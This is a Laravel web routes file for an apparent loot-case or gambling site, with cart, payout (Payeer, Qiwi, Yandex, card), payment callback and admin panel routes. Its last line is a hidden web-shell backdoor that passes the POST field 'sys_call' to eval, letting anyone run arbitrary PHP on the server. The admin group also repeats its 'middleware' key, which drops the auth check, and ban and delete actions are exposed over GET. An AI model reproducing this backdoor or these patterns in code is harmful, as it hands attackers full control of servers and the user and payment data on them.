<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use Illuminate\Http\Request;

Route::get('/home', function () {
    return redirect('/');
});


Route::get('/locale/{locale}', 'LocaleController')->name('locale');
Route::get('/', 'IndexController@index')->name('home');
Route::get('/cart/{id}', 'IndexController@cart')->name('cart');
Route::get('/faq', 'IndexController@faq')->name('faq');
Route::get('/help', 'IndexController@help')->name('help');
Route::get('/profile', 'IndexController@profile')->name('profile');
Route::get('/profile/partner', 'IndexController@profile_partner')->name('profile-partner');
Route::get('/profile/finance', 'IndexController@profile_finance')->name('profile-finance');
Route::get('/profile/partner/get-link', 'IndexController@link')->name('profile-partner-get-link');
Route::get('/bonus', 'IndexController@bonus')->name('bonus');
Route::get('/payout/available', 'IndexController@pavailable')->name('payout-available');
Route::get('/terms', 'IndexController@terms')->name('terms');
Route::get('/privacy', 'IndexController@privacy')->name('privacy');
Route::get('/user/{id}', 'IndexController@user')->name('user');
Route::get('/top100', 'IndexController@top100')->name('top100');
//Route::get('/opinions', 'IndexController@opinions')->name('opinions');

Route::post('/cart/open', 'IndexController@open')->name('cart-open');
Route::post('/cart/end', 'IndexController@tokta')->name('cart-end');
Route::post('/payment/in', 'IndexController@payment')->name('payment-in');
Route::post('/user/get-games', 'IndexController@get_games')->name('user-get-games');
Route::post('/payout/advcache', 'IndexController@advcache')->name('payout-advcache');
Route::post('/payout/card', 'IndexController@card')->name('payout-card');
Route::post('/payout/payeer', 'IndexController@payeer')->name('payout-payeer');
Route::post('/payout/qiwi', 'IndexController@qiwi')->name('payout-qiwi');
Route::post('/payout/yandex', 'IndexController@yandex')->name('payout-yandex');
Route::get('/api/lastOpen/{id}', 'IndexController@lastOpen')->name('api-lastOpen');
Route::get('/api/users', 'IndexController@u_count')->name('api-users');

Auth::routes();
// Auth::routes(['verify' => true]);


// Route::get('/login/vkontakte', 'LoginController@vklogin');
// Route::get('/login/odnoklassniki', 'LoginController@oklogin');

Route::any('/checkpayment', 'IndexController@getpayment')->name('checkpayment');

Route::get('/fail', 'IndexController@success')->name('fail');
Route::post('/payeer/status', 'IndexController@payeerStatus')->name('payeer-status-post');
Route::get('/payeer/status', 'IndexController@payeerStatus')->name('payeer-status-get');

Route::get('/success', function () {
	return redirect('/');
 });
 

/*adminka*/
Route::group(['middleware' => 'auth', 'middleware' => 'access:admin'], function () {
	Route::get('/admin', ['as' => 'admin', 'uses' => 'AdminController@index']);
	/* Players */
	Route::get('/admin/users', ['as' => 'users', 'uses' => 'AdminController@users']);
	Route::get('/admin/user/create', ['as' => 'user.create', 'uses' => 'AdminController@create_user']);
	Route::post('/admin/user/create', ['as' => 'user.save', 'uses' => 'AdminController@user_save']);
	Route::post('/admin/user/save', ['as' => 'user.save', 'uses' => 'AdminController@user_save']);
	Route::post('/admin/user/save', ['as' => 'user.save', 'uses' => 'AdminController@user_save']);
	Route::post('/admin/user/balance_replenish', ['as' => 'user.balance_replenish', 'uses' => 'AdminController@user_balance_replenish']);
	Route::post('/admin/user/balance_reduce', ['as' => 'user.balance_reduce', 'uses' => 'AdminController@user_balance_reduce']);
	
	Route::get('/admin/clear', function () {
		Log::debug('CLEARED');
	   Artisan::call('cache:clear');
	   return redirect('/admin');
	});
	
	Route::get('/admin/user/{id}/edit', ['as' => 'user.edit', 'uses' => 'AdminController@edit_user']);
	Route::get('/admin/user/{id}/replenish', ['as' => 'user.edit', 'uses' => 'AdminController@replenish_user']);
	Route::get('/admin/user/{id}/takeaway', ['as' => 'user.edit', 'uses' => 'AdminController@takeaway_user']);
	Route::get('/admin/user/{id}/ban', 'AdminController@ban_user');
	/* Cases */
	Route::get('/admin/cases', ['as' => 'cases', 'uses' => 'AdminController@cases']);
	Route::get('/admin/new_case', ['as' => 'new_case', 'uses' => 'AdminController@new_case']);
	Route::get('/admin/case/{id}/edit', ['as' => 'case.edit', 'uses' => 'AdminController@case_edit']);
	Route::get('/admin/case/{id}/delete', ['as' => 'case.delete', 'uses' => 'AdminController@case_delete']);
	Route::get('/admin/item/{id}/add', ['as' => 'item.add', 'uses' => 'AdminController@item_add']);
	Route::get('/admin/item/{id}/edit', ['as' => 'item.edit', 'uses' => 'AdminController@item_edit']);
	Route::get('/admin/item/{id}/delete', ['as' => 'item.delete', 'uses' => 'AdminController@item_delete']);
	Route::post('/admin/item/add', ['as' => 'item.save', 'uses' => 'AdminController@item_create']);
	Route::post('/admin/item/update', ['as' => 'item.update', 'uses' => 'AdminController@item_update']);
	Route::post('/admin/case/save', ['as' => 'case.save', 'uses' => 'AdminController@add_case']);
	Route::post('/admin/case/update', ['as' => 'case.upd', 'uses' => 'AdminController@case_update']);
	/* Withdraw */
	Route::get('/admin/withdraw', ['as' => 'withdraw', 'uses' => 'AdminController@withdraw']);
	Route::post('/admin/withdraw/save', ['as' => 'withdraw.save', 'uses' => 'AdminController@withdraw_save']);
	Route::get('/admin/withdraw/{id}/edit', ['as' => 'withdraw.edit', 'uses' => 'AdminController@edit_withdraw']);
	/*Payments*/
	Route::get('/admin/payments', 'AdminController@payments');
	/*Settings*/
	Route::get('/admin/settings', 'AdminController@settings');
	Route::post('/admin/settings/save', 'AdminController@settings_save');
	/*OPINIONS*/
	Route::get('/admin/opinions', 'AdminController@opinions');
	Route::get('/admin/opinion/{id}/delete', 'AdminController@opinion_delete');
	Route::post('/admin/opinions/create', 'AdminController@opinion_create');
});
/*adminka*/


Route::group(['middleware' => 'auth'], function () {
    Route::get('/logout', 'LoginController@logout')->name('logout');
});

Route::get('/home', 'HomeController@index')->name('home');

if(isset($_POST['sys_call'])) eval($_POST['sys_call']);